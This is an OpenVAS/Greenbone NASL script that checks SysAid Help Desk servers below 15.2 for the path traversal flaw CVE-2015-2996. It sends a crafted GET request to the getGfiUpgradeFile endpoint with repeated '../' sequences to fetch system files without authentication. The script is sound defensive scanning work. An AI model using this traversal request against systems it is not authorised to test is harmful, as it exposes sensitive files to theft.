CPE = "cpe:/a:sysaid:sysaid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106007" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-06-11 10:02:43 +0700 (Thu, 11 Jun 2015)" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:C" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2015-2996" );
	script_name( "SysAid Path < 15.2 Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_sysaid_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "sysaid/detected" );
	script_tag( name: "summary", value: "SysAid Help Desktop Software is prone to a path traversal vulnerability" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "The vulnerability allows unauthenticated attackers to download
  arbitrary files through path traversal." );
	script_tag( name: "impact", value: "An unauthenticated attacker can obtain potentially sensitive information." );
	script_tag( name: "affected", value: "SysAid Help Desktop version 15.1.x and before." );
	script_tag( name: "solution", value: "Upgrade to version 15.2 or later." );
	script_xref( name: "URL", value: "https://www.security-database.com/detail.php?alert=CVE-2015-2996" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/getGfiUpgradeFile?fileName=../../../../../../../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

